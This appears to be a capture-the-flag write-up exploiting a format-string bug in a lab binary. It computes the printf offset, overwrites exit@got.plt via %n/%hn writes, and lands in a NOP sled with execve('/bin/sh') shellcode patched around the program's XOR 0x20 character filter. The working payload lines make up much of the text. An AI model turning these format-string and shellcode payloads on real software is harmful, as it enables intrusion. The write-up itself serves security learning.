
=> We have a fgets that fill a buffer at most 100 bytes
=> The loop modify value of the buffer's values between "@" and "["
=> Every values between 0x41 - 0x5a is modified by a XOR 0x20
=> The buffer is then printed


=> Let's try to fill the buffer of "A"
=> It doesn't touch the ret addr of main
=> We can see that the buffer in printed with the printf function without the format protection
=> Then we have string format exploit

=> We will try to overwrite the exit plt by an address pointing to an address in our buffer
pointing to NOP slide and a shell code

0xffffd6d0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd6e0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd6f0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd700:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd710:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd720:	0x61616161	0x61616161	0x00616161	0x00000063


=> This is values of our stack filled by "A"
=> Let's reserve some bytes for the format string and pick a value to point to
=> We pick 0xffffd6e0

=> We create the payload to overwrite exit@got.plt

=> Firstly we calcul the offset from an arbitrary address write at the start of our buffer
r < <(python -c 'print "AAAA" + "%p "*15')
aaaa0x64 0xf7fcfac0 (nil) (nil) (nil) (nil) 0xffffffff 0xffffd664 (nil) 0x61616161 <- Found

=> Offset: 10


=> After that we will slice the address in 2 and write the last 2 bytes with the h (short) format

0x80497e0 <exit@got.plt>:	0x08048376

ffff:				  65535
d6ef:	55023 - 8 (2 addr) 	= 55015
rest:	65535 - 55023		= 10512

r < <(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55015x" + "%10$n" + "%10512x" + "%11$hn" + "\xcc"*(62-28)')


=> It works it's catch by the SIGTRAP
=> Then we replace the \xcc by the NOP slide and the shell code


r < <(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55015x" + "%10$n" + "%10512x" + "%11$hn" + "\x90"*(62-28) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')

=> It doesn't work ! We have a segfault at 0xffffd77b
Program received signal SIGSEGV, Segmentation fault.
0xffffd77b in ?? ()

=> Which is a address nowhere
=> Let's check the stack
0xffffd6ec:	0x90909090	0x90909090	0x90909090	0x31909090
0xffffd6fc:	0x2f6870c0	0x6868732f	0x6e69622f	0xc189e389

=> Look at the start of our shellcode 31 c0 70
=> The 0x50 has been transformed to 0x70
=> It's because we forget that every value [0x41 - 0x5a] are modified with XOR 0x20
=> Let's replace this place with a different instruction

0:  31 c0                   xor    eax,eax
2:  50                      push   eax

0:  31 c0                   xor    eax,eax
2:  6a 00                   push   0x0

=> We push 0x0 or eax (= 0 after xor) for the null terminated character to the stack

r < <(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55015x" + "%10$n" + "%10512x" + "%11$hn" + "\x90"*(62-28) + "\x31\xc0\x6a\x00\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
